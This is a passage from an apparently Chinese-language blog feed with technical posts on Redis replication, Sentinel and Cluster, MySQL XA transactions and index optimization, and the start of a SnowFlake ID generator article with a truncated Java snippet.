<li>如果从服务器保存的运行ID和当前连接的主服务器的运行ID相同，主服务器可以继续尝试执行部分重同步操作</li>
<li>如果不同，主服务器将对从服务器执行完全重同步操作。</li>
</ul>
<h3 id="优缺点："><a href="#优缺点：" class="headerlink" title="优缺点："></a>优缺点：</h3><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><ul>
<li>采用主备架构，可以在主库出现故障的时候自动进行主备切换，从库升级为主库提供服务；另一方面，开启数据持久化功能和配置合理的备份策略，能有效的解决数据误操作和数据异常丢失的问题；</li>
<li>读写分离策略：从节点可以扩展主库节点的读能力，有效应对大并发量的读操作。</li>
</ul>
<h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ul>
<li>故障恢复复杂，如果没有RedisHA系统（需要开发），当主库节点出现故障时，需要手动将一个从节点晋升为主节点，同时需要通知业务方变更配置，并且需要让其它从库节点去复制新主库节点，整个过程需要人为干预，比较繁琐；</li>
</ul>
<h2 id="Redis-Sentinel"><a href="#Redis-Sentinel" class="headerlink" title="Redis Sentinel"></a>Redis Sentinel</h2><p>Redis Sentinel是社区版本推出的原生高可用解决方案，其部署架构主要包括两部分：Redis Sentinel集群和Redis数据集群。</p>
<p>其中Redis Sentinel集群是由若干Sentinel节点组成的分布式集群，可以实现故障发现、故障自动转移、配置中心和客户端通知。Redis Sentinel的节点数量要满足2n+1（n&gt;=1）的奇数个。</p>
<p><img src="https://huhansi.github.io/images/2020-04-13-redis2.png" alt="Redis sentinel集群部署1"></p>
<p><img src="https://huhansi.github.io/images/2020-04-13-redis3.png" alt="Redis sentinel集群部署2"></p>
<h3 id="优缺点：-1"><a href="#优缺点：-1" class="headerlink" title="优缺点："></a>优缺点：</h3><h4 id="优点：-1"><a href="#优点：-1" class="headerlink" title="优点："></a>优点：</h4><ul>
<li>Redis Sentinel集群部署简单；</li>
<li>能够解决Redis主从模式下的高可用切换问题；</li>
<li>很方便实现Redis数据节点的线形扩展，轻松突破Redis自身单线程瓶颈，可极大满足Redis大容量或高性能的业务需求；</li>
<li>可以实现一套Sentinel监控一组Redis数据节点或多组数据节点。</li>
</ul>
<h4 id="缺点：-1"><a href="#缺点：-1" class="headerlink" title="缺点："></a>缺点：</h4><ul>
<li>部署相对Redis主从模式要复杂一些，原理理解更繁琐；</li>
<li>资源浪费，Redis数据节点中slave节点作为备份节点不提供服务；</li>
<li>Redis Sentinel主要是针对Redis数据节点中的主节点的高可用切换，对Redis的数据节点做失败判定分为主观下线和客观下线两种，对于Redis的从节点有对节点做主观下线操作，并不执行故障转移。</li>
<li>不能解决读写分离问题，实现起来相对复杂。</li>
</ul>
<h2 id="Redis-Cluster"><a href="#Redis-Cluster" class="headerlink" title="Redis Cluster"></a>Redis Cluster</h2><p>Redis Cluster是社区版推出的Redis分布式集群解决方案，主要解决Redis分布式方面的需求，比如，当遇到单机内存，并发和流量等瓶颈的时候，Redis Cluster能起到很好的负载均衡的目的。</p>
<p>Redis Cluster集群节点最小配置6个节点以上（3主3从），其中主节点提供读写操作，从节点作为备用节点，不提供请求，只作为故障转移使用。</p>
<p>Redis Cluster采用虚拟槽分区，所有的键根据哈希函数映射到0～16383个整数槽内，每个节点负责维护一部分槽以及槽所印映射的键值数据。</p>
<p><img src="https://huhansi.github.io/images/2020-04-13-redis4.png" alt="Redis Cluster部署"></p>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><h4 id="优点：-2"><a href="#优点：-2" class="headerlink" title="优点："></a>优点：</h4><ul>
<li>无中心架构；</li>
<li>数据按照slot存储分布在多个节点，节点间数据共享，可动态调整数据分布；</li>
<li>可扩展性：可线性扩展到1000多个节点，节点可动态添加或删除；</li>
<li>高可用性：部分节点不可用时，集群仍可用。通过增加Slave做standby数据副本，能够实现故障自动failover，节点之间通过gossip协议交换状态信息，用投票机制完成Slave到Master的角色提升；</li>
<li>降低运维成本，提高系统的扩展性和可用性。</li>
</ul>
<h4 id="缺点：-2"><a href="#缺点：-2" class="headerlink" title="缺点："></a>缺点：</h4><ul>
<li><p>Client实现复杂，驱动要求实现Smart Client，缓存slots mapping信息并及时更新，提高了开发难度，客户端的不成熟影响业务的稳定性。目前仅JedisCluster相对成熟，异常处理部分还不完善，比如常见的“max redirect exception”。</p>
</li>
<li><p>节点会因为某些原因发生阻塞（阻塞时间大于clutser-node-timeout），被判断下线，这种failover是没有必要的。</p>
</li>
<li><p>数据通过异步复制，不保证数据的强一致性。</p>
</li>
<li><p>多个业务使用同一套集群时，无法根据统计区分冷热数据，资源隔离性较差，容易出现相互影响的情况。</p>
</li>
<li><p>Slave在集群中充当“冷备”，不能缓解读压力，当然可以通过SDK的合理设计来提高Slave资源的利用率。</p>
</li>
<li><p>Key批量操作限制，如使用mset、mget目前只支持具有相同slot值的Key执行批量操作。对于映射为不同slot值的Key由于Keys不支持跨slot查询，所以执行mset、mget、sunion等操作支持不友好。</p>
</li>
<li><p>Key事务操作支持有限，只支持多key在同一节点上的事务操作，当多个Key分布于不同的节点上时无法使用事务功能。</p>
</li>
<li><p>Key作为数据分区的最小粒度，不能将一个很大的键值对象如hash、list等映射到不同的节点。</p>
</li>
<li><p>不支持多数据库空间，单机下的redis可以支持到16个数据库，集群模式下只能使用1个数据库空间，即db 0。</p>
</li>
<li><p>复制结构只支持一层，从节点只能复制主节点，不支持嵌套树状复制结构。</p>
</li>
<li><p>避免产生hot-key，导致主库节点成为系统的短板。</p>
</li>
<li><p>避免产生big-key，导致网卡撑爆、慢查询等。</p>
</li>
<li><p>重试时间应该大于cluster-node-time时间。</p>
</li>
<li><p>Redis Cluster不建议使用pipeline和multi-keys操作，减少max redirect产生的场景。</p>
</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://juejin.im/entry/5b7a27ade51d4538d5174b83" target="_blank" rel="noopener">这可能是目前最全的Redis高可用技术解决方案总结</a></p>
<p><a href>Redis设计与实现-黄建宏</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>主从</tag>
        <tag>哨兵</tag>
        <tag>集群</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL中的XA事务</title>
    <url>/2020/04/12/MySQL/2020-04-12-MySQL%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8FXA%E4%BA%8B%E5%8A%A1/</url>
    <content><![CDATA[<h1 id="MySQL中的XA事务"><a href="#MySQL中的XA事务" class="headerlink" title="MySQL中的XA事务"></a>MySQL中的XA事务</h1><p>存储引擎的事务特性能够保证在存储引擎级别实现ACID，而分布式事务则让存储引擎级别的ACID可以扩展到数据库层面，甚至可以扩展到多个数据库之间-这需要两阶段提交实现。MySQL5.0和更新的版本的数据库已经开始支持XA事务了。</p>
<p>XA事务中需要有一个事务协调器来保证所有的事务参与者都完成了准备工作（第一阶段）。如果协调器受到所有参与者都准备好的消息，就会告诉所有的事务可以提交了，这时第二阶段。MySQL在这个XA事务过程中扮演一个参与者的角色，而不是协调者。</p>
<p>实际上，在MySQL中有两种XA事务。一方面，MySQL可以参与到外部的分布式事务中；另一方面，还可以通过XA事务来协调存储引擎和二进制日志。</p>
<h2 id="内部XA事务"><a href="#内部XA事务" class="headerlink" title="内部XA事务"></a>内部XA事务</h2><p>MySQL本身的插件式架构导致再起内部需要使用XA事务。MySQL中各个存储引擎是完全独立的，彼此不知道对方的存在，所以一个跨存储引擎的事务就需要一个外部的协调者。如果不使用XA协议，例如，跨存储引擎的事务提交就只是顺序地要求每个存储引擎各自提交。如果在某个存储提交过程中发生系统崩溃，就会破坏事务的特性。（要么全部提交，要么不做任何操作）。</p>
<p>如果将MySQL记录的二进制日志操作看做一个独立的“存储引擎”，就不难理解为什么即使是一个存储殷勤参数的事务仍然需要XA事务了。在存储引擎提交的同时，需要将“提交”的信息写入二进制日志，这是一个分布式事务，只不过二进制日志的参与者是MySQL本身。</p>
<h2 id="外部XA事务"><a href="#外部XA事务" class="headerlink" title="外部XA事务"></a>外部XA事务</h2><p>外部XA用于跨多MySQL实例的分布式事务，需要应用层作为协调者，通俗的说就是比如我们在PHP中写代码，那么PHP书写的逻辑就是协调者。应用层负责决定提交还是回滚，崩溃时的悬挂事务。MySQL数据库外部XA可以用在分布式数据库代理层，实现对MySQL数据库的分布式事务支持。</p>
<h3 id="MySQL事务基本语法"><a href="#MySQL事务基本语法" class="headerlink" title="MySQL事务基本语法"></a>MySQL事务基本语法</h3><blockquote>
<p>XA {START|BEGIN} xid [JOIN|RESUME] 启动xid事务 (xid 必须是一个唯一值; 不支持[JOIN|RESUME]子句)<br>XA END xid [SUSPEND [FOR MIGRATE]] 结束xid事务 ( 不支持[SUSPEND [FOR MIGRATE]] 子句)<br>XA PREPARE xid 准备、预提交xid事务<br>XA COMMIT xid [ONE PHASE] 提交xid事务<br>XA ROLLBACK xid 回滚xid事务<br>XA RECOVER 查看处于PREPARE 阶段的所有事务</p>
</blockquote>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/soonfly/article/details/70677138" target="_blank" rel="noopener">详解Mysql分布式事务XA（跨数据库事务）</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>XA</tag>
        <tag>分布式事务</tag>
      </tags>
  </entry>
  <entry>
    <title>优化MySQL索引的N种方法</title>
    <url>/2020/04/12/MySQL/2020-04-12-%E4%BC%98%E5%8C%96MySQL%E7%B4%A2%E5%BC%95%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="优化MySQL索引的N种方法"><a href="#优化MySQL索引的N种方法" class="headerlink" title="优化MySQL索引的N种方法"></a>优化MySQL索引的N种方法</h1><p>正确创建和使用索引是实现高性能查询的基础。</p>
<h2 id="独立的列"><a href="#独立的列" class="headerlink" title="独立的列"></a>独立的列</h2><p>索引列不能是表达式的一部分， 也不能是函数的参数，必须是独立的列。如果查询中的列不是独立的，则MySQL就不会使用索引。</p>
<h2 id="前缀索引和索引选择性"><a href="#前缀索引和索引选择性" class="headerlink" title="前缀索引和索引选择性"></a>前缀索引和索引选择性</h2><p>有时候需要索引很长的字符列，这回让索引变得大且慢。那么，就可以索引开始的部分字符，这样可以大大节约索引空间，从而提高索引效率。</p>
<p>一般情况下某个列前缀的选择性也是足够高的，足以满足查询性能。对于BLOB、TEXT或者很长的VARCHAR类型的列，必须使用前缀索引，因为MySQL不允许索引这些列的完整长度。</p>
<p>前缀所以是一种能使索引更小、更快的有效办法，但另一方面，它也限制了使用前缀索引做ORDER BY 和GROUP BY的可能，也无法使用前缀索引做覆盖扫描。</p>
<h2 id="多列索引"><a href="#多列索引" class="headerlink" title="多列索引"></a>多列索引</h2><p>在多个列上建立独立的单列索引大部分情况下并不能提高MySQL的查询性能。MySQL5.0和更新的版本引入了一种叫“索引合并”的策略，一定程度上可以使用表上的多个单列索引来定位指定的行。在更早的版本上，MySQL只能使用其中某一个单列索引，然而这种情况下没有哪一个独立的单列索引是非常有效的。</p>
<p>例如，表film_actor在film_id和actor_id上各有一个单列索引。但对于下面这个查询WHERE条件，这两个单列索引都不是好的选择</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> film_id, actor_id <span class="keyword">FROM</span> sakila.film_actor <span class="keyword">WHERE</span> actor_id = <span class="number">1</span> <span class="keyword">or</span> film_id = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>在老的MySQL版本中，MySQL对这个查询会使用全表扫描。除非改写成吐下两个查询UNION的方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> film_id, actor_id <span class="keyword">FROM</span> sakila.film_actor <span class="keyword">where</span> actor_id = <span class="number">1</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> film_id, actor_id <span class="keyword">FROM</span> sakila.film_acotr <span class="keyword">where</span> film_id = <span class="number">1</span></span><br><span class="line"><span class="keyword">AND</span> actor_id &lt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>但在MySQL5.0和更新的版本中，查询能够同时使用这两个单列索引进行扫描，并将结果进行合并。这种算法有三个变种：OR条件的联合，AND条件的小脚，组合前两种状况的联合及相交。</p>
<p>MySQL会使用这类技术优化复杂查询，所以在某些语句的Extra列中还可以看到嵌套操作。</p>
<p>索引合并策略有时候是一种优化的结果，但实际上更多时候说明了表上的索引建的很糟糕：</p>
<ul>
<li>当出现服务器对多个索引做相交操作时（通常有多个AND），通常意味着需要一个包含所有相关列的多列索引</li>
<li>当服务器需要对多个索引做联合操作时（通常有多个OR），通常需要耗费大量的CPU和内存资源在算法的缓存、排序和合并操作上。特别是当其中有些索引的选择性不高，需要合并带扫描返回大量数据的时候。</li>
</ul>
<h2 id="选择合适的索引列顺序"><a href="#选择合适的索引列顺序" class="headerlink" title="选择合适的索引列顺序"></a>选择合适的索引列顺序</h2><h2 id="聚簇索引"><a href="#聚簇索引" class="headerlink" title="聚簇索引"></a>聚簇索引</h2><p>聚簇索引并不是一种单独的索引类型，而是一种数据存储方式。InnoDB的聚簇索引实际上在同一个结构中保存了B-Tree索引和数据行。</p>
<p>当表有聚簇索引时，它的数据行实际上存放在索引的叶子页上。术语“聚簇”表示数据行和相邻的键值紧凑地存储在一起。因为无法同时把数据行存放在两个不同的地方，所以一个表只能由一个聚簇索引。</p>
<p>InnoDB通过主键聚集数据，也就是说，主键列会建一个聚簇索引。</p>
<p>如果没有定义主键，InnoDB会选择一个唯一的非空索引代替。如果没有这样的索引，InnoDB会隐式定义一个主键来作为聚簇索引。</p>
<p>聚簇索引有一些重要的优点：</p>
<ul>
<li>可以把相关的数据保存在一起。例如，实现电子邮箱时，可以根据用户ID来聚集数据，这样只需要从磁盘读取少数的数据页就能获取某个用户的全部邮件。如果没有使用聚簇索引，则每封邮件都可能导致一次磁盘IO。</li>
<li>数据访问更快。聚簇索引将索引和数据保存在同一个B-Tree中，因此从聚簇索引中获取数据通常比在非聚簇索引中查找要快</li>
<li>使用覆盖索引扫描的查询可以直接使用页节点的主键值</li>
</ul>
<p>同时聚簇索引也有一些缺点：</p>
<ul>
<li>聚簇数据最大限度地提高了IO密集型应用的性能，但如果数据全部都放在内存中，则访问的顺序就没那么重要了</li>
<li>插入速度验证依赖于插入顺序。按照主键的顺序插入是家在数据到InnoDB表中速度最快的方式。但如果不是按照主键顺序加载数据，那么在加载完后最好使用OPTIMIZE TABLE命令重新组织一下表</li>
<li>更新聚簇索引的代价很高，因为会强制InnoDB将每个被更新的行移动到新的位置</li>
<li>基于聚簇索引的表在插入新行，或者主键被更新导致需要移动行的时候，可能面临“页分裂”的问题。当行的主键值要求必须将这一行插入到某个已满的页中时，存储引擎会将该页分裂成两个页面来容纳该行，这就是一次页分裂操作。页分裂会导致表占用更多的磁盘空间。</li>
<li>聚簇索引可能导致全表扫描变慢，尤其是行比较稀疏，或者由于页分裂导致数据存储不连续时候</li>
<li>二级索引（非聚簇索引）可能比想象的要大，因为在二级索引的叶子节点包含了引用行的主键列（二级索引保存的是行的主键值，而不是指向行的物理位置的指针）。</li>
</ul>
<h2 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h2><p> 如果一个索引包含（或者说覆盖）所有需要查询的字段的值，就称之为覆盖索引。覆盖索引是非常有用的工具，能够极大地提高性能。</p>
<ul>
<li>索引条目通常远小于数据行大小，所以如果只需要读取索引，那就会极大地较少减少数据访问量。</li>
<li>因为索引是按照列值顺序存储的（至少单个页内是如此），所以，对于IO密集型的范围查询回避随机从磁盘读取每一行数据IO要少得多</li>
<li>一些存储引擎如MyISAM在内存中只缓存索引，数据则依赖于操作系统缓存，一次访问数据需要一次系统调用</li>
<li>由于InnoDB的聚簇索引，覆盖索引对InnoDB表特别有用。InnoDB的二级索引在叶子节点中保存了行的主键值，所以如果二级主键能够覆盖查询，则可以避免对主键索引的二次查询。</li>
</ul>
<h2 id="使用索引扫描来做排序"><a href="#使用索引扫描来做排序" class="headerlink" title="使用索引扫描来做排序"></a>使用索引扫描来做排序</h2><p>只有当索引的列顺序和ORDER BY子句的顺序完全一致，并且所有列的排序方向（倒序或正序）都一样时，MySQL才能够使用索引来对结果做排序。如果查询需要关联多张表，则只有当ORDER BY子句引用的字段全部为第一个表时，才能使用索引做排序。ORDER BY子句和查找型查询的限制是一样的：需要满足索引的最左前缀的要求；否则MySQL都需要执行排序操作。</p>
<h2 id="压缩（前缀压缩）索引"><a href="#压缩（前缀压缩）索引" class="headerlink" title="压缩（前缀压缩）索引"></a>压缩（前缀压缩）索引</h2><p>MyISAM使用前缀要说来减少索引的大小，从而让更多的索引可以放入内存中，这在某些情况下能极大地提高性能。默认只压缩字符串，但通过参数配置也可以对整数做压缩。MyIASM压缩每个索引块的方法是，先完全保存索引块中的第一个值，然后将其他值和第一个值进行比较得到相同前缀的字节数和剩余的不同后缀部分，把这部分存储起来即可。</p>
<h2 id="冗余和重复索引"><a href="#冗余和重复索引" class="headerlink" title="冗余和重复索引"></a>冗余和重复索引</h2><p>重复索引是指在相同的列上按照相同的顺序创建的相同类型的索引。应该避免这样创建重复索引，发现以后也应该立即移除。</p>
<p>冗余索引和重复索引有一些不同。如果创建了索引（A，B），再创建索引（A）就是冗余索引。因为这只是前一个索引的前缀索引。因此索引（A，B）也可以当做索引（A）来使用（这种冗余只是对B-Tree索引来说的）。但是如果再创建索引（B,A），则不是冗余索引，索引（B）也不是，因为B不是索引（A，B）的最左前缀列。另外，其他不同类型的索引（例如哈希索引或全文索引）也不会是B-Tree索引的冗余索引，而无论覆盖的索引列是什么。</p>
<h2 id="未使用的索引"><a href="#未使用的索引" class="headerlink" title="未使用的索引"></a>未使用的索引</h2><p>删除即可。</p>
<h2 id="索引和锁"><a href="#索引和锁" class="headerlink" title="索引和锁"></a>索引和锁</h2><p>索引可以让查询锁定更少的行。如果你的查询从不访问哪些不需要的行，那么就会锁定更少的行，从两个方面看着对性能都有好处。首先，虽然InnoDB的行锁效率很高，内存的使用也很少，但是锁定行的时候仍然会带来额外开销；其次，锁定超过需要的行会增加锁争用并减少并发性。</p>
<p>InnoDB只有在访问行的时候才会对其加锁，而索引能够减少InnoDB访问的行数，从而减少锁的数量。但这只有当InnoDB在存储引擎层能够过滤掉所有不需要的行时才有效。如果索引无法过滤掉无效的行，那么在InnoDB检索到数据并返回给服务器层以后，MySQL服务器才能应用WHERE子句。这时候已经无法避免锁定行了：InnoDB已经锁住了这些行，到适当时候才释放。在MySQL5.1 和更新的版本中，InnoDB可以在服务器端过滤掉行之后就释放锁，但在早期的MySQL版本中，InnoDB只有在事务提交后才能释放锁。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>索引</tag>
        <tag>前缀索引</tag>
        <tag>索引优化</tag>
        <tag>聚簇索引</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL中的索引及其实现</title>
    <url>/2020/04/12/MySQL/2020-04-12-MySQL%E4%B8%AD%E7%9A%84%E7%B4%A2%E5%BC%95%E5%8F%8A%E5%85%B6%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="MySQL中的索引及其实现"><a href="#MySQL中的索引及其实现" class="headerlink" title="MySQL中的索引及其实现"></a>MySQL中的索引及其实现</h1><p>索引，在MySQL中也叫做键（Key）是存储引擎用于快速找到记录的一种数据结构。在MySQL中，存储引擎用类似的方法使用索引，其现在索引中找到对应值，然后根据匹配的索引记录找到对应的数据行。</p>
<p>索引可以包含一个或多个列的值。如果索引包含多个列，那么列的顺序也十分重要，因为MySQL只能高效地使用索引的最左前缀列。</p>
<h2 id="索引的类型"><a href="#索引的类型" class="headerlink" title="索引的类型"></a>索引的类型</h2><p>索引有很多种类型，可以为不同的场景提供更好的性能。在MySQL中，索引是在存储引擎层而不是服务器层实现的。所以，并没有统一的索引标准：不同存储引擎的索引的工作方式并不一样，也不是所有的存储引擎都支持所有类型的索引。及时多个存储引擎支持同一种类型的索引，其底层的实现也可能不同。</p>
<h3 id="B-Tree索引"><a href="#B-Tree索引" class="headerlink" title="B-Tree索引"></a>B-Tree索引</h3><p>我们着重看一下InnoDB使用的B-Tree索引。InnoDB使用的B-Tree索引的底层的数据结构是B+Tree</p>
<p>先看看B+Tree的样子：</p>
<p><img src="https://huhansi.github.io/images/2020-04-12-btree.png" alt="B+Tree"></p>
<p>一颗传统的M阶B+树需要满足以下几个要求：</p>
<ul>
<li>从根节点到叶节点的所有路径都具有相同的长度</li>
<li>所有数据信息都存储在叶子节点，非叶子节点仅作为叶子节点的索引存在</li>
<li>根节点至少拥有两颗子树</li>
<li>每个树节点最多拥有M个子树</li>
<li>每个树节点（除了根节点）拥有至少M/2个子树</li>
</ul>
<p><strong>B+树是为了磁盘及其他存储辅助设备而设计的一种平衡查找树(不是二叉树)，在B+树中，所有记录的节点按大小顺序存放在同一层的叶节点中，各叶子节点用指针进行连接</strong></p>
<p>通常来说，B+树索引用于基于磁盘的数据库系统，即数据最后持久化存放在磁盘上，每个页的叶子节点一般包含较多的记录，因此具有较高的扇出。这意味着在数据库中B+树索引高度一般较小，在2~3层，其高度也决定了磁盘I/O搜索的次数。</p>
<p>还有一点需要注意的是，实际上根据B+树索引并不能找到一个给定值的具体行，B+树索引能找到的只是查找数据行所在的页。然后数据库通过把数据页读入内存，再在内存中进行查找，最后得到查找的数据。</p>
<p>B-Tree对索引列是顺序组织存储的，所以很适合查找范围数据。</p>
<h4 id="适用于B-Tree索引查找的类型"><a href="#适用于B-Tree索引查找的类型" class="headerlink" title="适用于B-Tree索引查找的类型"></a>适用于B-Tree索引查找的类型</h4><h5 id="全值匹配"><a href="#全值匹配" class="headerlink" title="全值匹配"></a>全值匹配</h5><p>全值匹配指的是和索引中的所有列进行匹配。例如查找姓名为XXX，年龄为YYY的人。</p>
<h5 id="匹配最左前缀"><a href="#匹配最左前缀" class="headerlink" title="匹配最左前缀"></a>匹配最左前缀</h5><p>如果索引有多列的话，可以只使用第一列来查找</p>
<h5 id="匹配列前缀"><a href="#匹配列前缀" class="headerlink" title="匹配列前缀"></a>匹配列前缀</h5><p>也可以只匹配某一列的值的开头部分。</p>
<h5 id="匹配范围值"><a href="#匹配范围值" class="headerlink" title="匹配范围值"></a>匹配范围值</h5><p>匹配值再某个范围区间的查询</p>
<h5 id="精确匹配某一列并范围匹配另一列"><a href="#精确匹配某一列并范围匹配另一列" class="headerlink" title="精确匹配某一列并范围匹配另一列"></a>精确匹配某一列并范围匹配另一列</h5><p>对于联合索引来说，可以精确匹配第一列，范围匹配第二列，这样的查询也是支持的</p>
<h5 id="只访问索引的查询"><a href="#只访问索引的查询" class="headerlink" title="只访问索引的查询"></a>只访问索引的查询</h5><p>B-Tree通常可以支持“只访问索引”的查询，即查询只需要访问索引，而无需访问数据行。</p>
<h4 id="B-Tree索引的限制"><a href="#B-Tree索引的限制" class="headerlink" title="B-Tree索引的限制"></a>B-Tree索引的限制</h4><ul>
<li>如果不是按照索引的最左列开始查找，则无法使用索引。</li>
<li>不能跳过索引中的列。如果有联合索引（A、B、C），如果要查询数据（Ai、Cj）是不支持使用联合索引的。查找的时候只会使用第一列这个索引，也就是A列。</li>
<li>如果查询中有某个列的范围查询，则其右边所有列都无法使用索引优化查找。例如，存在联合索引（first_name, last_name，dob）。查询语句 where last_name = ‘smiti’ and first_name like ‘J%’ and dob = ‘1990-01-02’，这个查询只能使用到索引的前两列，因为LIKE在这里是一个范围查询。如果范围查询列值的数量有限，那么可以通过使用多个等于条件来代替范围条件。</li>
</ul>
<h3 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h3><p>哈希索引基于哈希表实现，只有<strong>精确匹配索引所有列的查询才有效</strong>。对于每一行数据，存储引擎都会对所有的索引列计算一个哈希码，哈希码是一个较小的值，并且不同键值的行计算出来的哈希码也不一样。哈希索引将所有的哈希码存储在索引中，同时在哈希表中保存指向每个数据行的指针。</p>
<p>在MySQL中，只有Memory引擎显示支持哈希索引，这也是Memory引擎表的默认索引类型。Memory引擎是支持非唯一哈希索引的。如果多个列的哈希值相同，索引会以链表的方式存放多个记录指针到同一个哈希条目中。</p>
<p>因为索引自身只需存储对应的哈希值，所以索引的结构十分紧凑，这也让哈希索引查找的速度非常快。</p>
<h4 id="哈希索引的限制"><a href="#哈希索引的限制" class="headerlink" title="哈希索引的限制"></a>哈希索引的限制</h4><ul>
<li>哈希索引只包含哈希值和行指针，而不存储字段值，所以不能使用索引中的值来避免读取行，不过，访问内存中的行的速度很快，所以大部分情况下这一点对性能的影响并不明显</li>
<li>哈希索引数据不是按照索引值顺序存储的，所以也就无法用于排序</li>
<li>哈希索引页不支持部分索引列的匹配查找，因为哈希索引始终是所用索引列的全部内容来计算哈希值的。</li>
<li>哈希索引只支持等值比较查询，包括=、IN()、&lt;=&gt;，也不支持任何范围查询</li>
<li>范围哈希索引非常快，除非有很多哈希冲突。当出现哈希冲突时，存储引擎必须遍历链表中所有的行指针，逐行进行比较，直到找到所有符合条件的行</li>
<li>如果哈希冲突很多的话，一些索引维护操作的代价也会很高。冲突越多，代价越大。</li>
</ul>
<p>InnoDB引擎有一个特殊的功能叫做“自适应哈希索引”。当InnoDB注意到某些索引值被使用得非常频繁时，它会在内存中基于B-Tree索引值上在创建一个哈希索引，这样就让B-Tree索引页具有哈希索引的一些优点。这是一个完全自动的，内部的行为，用户无法控制或者配置，不过如果有必要，完全可以关闭该功能。</p>
<h3 id="空间数据索引（R-Tree）"><a href="#空间数据索引（R-Tree）" class="headerlink" title="空间数据索引（R-Tree）"></a>空间数据索引（R-Tree）</h3><p>MyISAM表支持空间索引，可以用作地理数据存储。和B-Tree索引不同，这类索引无须前缀查询。空间索引会从所有维度来索引数据。查询时，可以有效地使用任意维度来组合查询。必须使用MySQL的GIS相关函数来维护数据。MySQL的GIS支持并不完善，所以大部分人都不会使用这个特性。</p>
<h3 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h3><p>全文索引是一种特殊类型的索引，它查找的是文本中的关键字，而不是直接比较索引中的值。</p>
<p>在相同的列上同时创建全文索引和基于值的B-Tree索引不会有冲突，全文索引适用于MATCH AGAINST操作，而不是普通的WHERE条件操作。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>索引</tag>
        <tag>B-Tree</tag>
        <tag>哈希索引</tag>
        <tag>全文索引</tag>
        <tag>最左前缀</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式ID生成-SnowFlake实现</title>
    <url>/2020/04/12/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8FID-%E9%9B%AA%E8%8A%B1%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="分布式ID生成-SnowFlake实现"><a href="#分布式ID生成-SnowFlake实现" class="headerlink" title="分布式ID生成-SnowFlake实现"></a>分布式ID生成-SnowFlake实现</h1><h2 id="SnowFlake原理"><a href="#SnowFlake原理" class="headerlink" title="SnowFlake原理"></a>SnowFlake原理</h2><p>Twitter的snowflake算法解决了分布式系统生成全局ID的需求，生成64位的Long型数字.</p>
<p>它是把64位分成各个部分，分别代表：</p>
<ul>
<li>第一位不使用，预留</li>
<li>接下来的41位表示毫秒时间</li>
<li>5位数据中心ID</li>
<li>5位worker的ID</li>
<li>最后12位是毫秒内的计数，12位的计数顺序号支持每个节点每毫秒产生4096个ID序列</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-04-12-snowflake.jpg" alt="位数分组图示"></p>
<p>这样的好处是：毫秒数在高位，生成的ID整体上按时间趋势递增；不依赖第三方系统，稳定性和效率较高，理论上QPS约为409.6w/s（1000*2^12），并且整个分布式系统内不会产生ID碰撞；可根据自身业务灵活分配bit位。</p>
<p>不足就在于：强依赖机器时钟，如果时钟回拨，则可能导致生成ID重复。</p>
<h2 id="SnowFlake实现"><a href="#SnowFlake实现" class="headerlink" title="SnowFlake实现"></a>SnowFlake实现</h2><p>因为实现比较简单，就贴一个网友的Java版<a href="https://github.com/beyondfengyu/SnowFlake" target="_blank" rel="noopener">实现</a>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * twitter的snowflake算法 -- java实现</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> beyond</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2016/11/26</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SnowFlake</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 起始的时间戳</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> START_STMP = <span class="number">1480166465631L</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 每一部分占用的位数</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> SEQUENCE_BIT = <span class="number">12</span>; <span class="comment">// 序列号占用的位数</span></span><br><span 